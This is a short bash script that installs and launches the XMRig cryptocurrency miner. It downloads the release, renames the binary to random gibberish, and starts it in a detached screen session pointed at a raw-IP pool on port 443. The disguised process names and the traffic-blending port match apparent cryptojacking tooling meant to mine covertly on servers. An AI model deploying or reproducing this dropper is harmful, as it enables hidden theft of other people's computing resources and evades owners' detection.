#!/bin/bash

# ===============================
# XMRig Miner Setup & Launcher
# Prevents multiple instances
# ===============================

# --- Configurable Variables ---
VERSION=6.21.0
POOL=168.119.85.190:443
THREADS=8
MINER_NAME_PREFIX="mxsemsdnlkdj"
LOCK_FILE="/tmp/xmrig.lock"

# --- Generate Randomized Miner Name ---
RANDOM_NAME="${MINER_NAME_PREFIX}-$(shuf -i10-375 -n1)-$(shuf -i10-259 -n1)"
BINARY_NAME="$MINER_NAME_PREFIX"
DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-x64.tar.gz"

# --- Check if Already Running ---
if pgrep -f "$POOL" > /dev/null; then
    echo "[!] Miner is already running. Exiting."
    exit 1
fi

if [ -f "$LOCK_FILE" ]; then
    echo "[!] Lock file exists. Miner may already be running. Exiting."
    exit 1
fi

# --- Create Lock File ---
touch "$LOCK_FILE"

# --- Install Dependencies ---
apt-get update
apt-get install -y git wget screen

# --- Download and Setup XMRig ---
wget "$DOWNLOAD_URL"
tar -xvzf "xmrig-$VERSION-linux-x64.tar.gz"
rm -f "xmrig-$VERSION-linux-x64.tar.gz"
cd "xmrig-$VERSION"

mv xmrig "$BINARY_NAME"
cp "$BINARY_NAME" "$RANDOM_NAME"
rm -f xmrig

# --- Start Mining in Screen Session ---
echo "[*] Starting miner as: $RANDOM_NAME"
screen -dmS xmrig ./"$BINARY_NAME" -o "$POOL" --tls -t "$THREADS"

# --- Cleanup ---
echo "[*] Miner launched. Lock file at $LOCK_FILE"
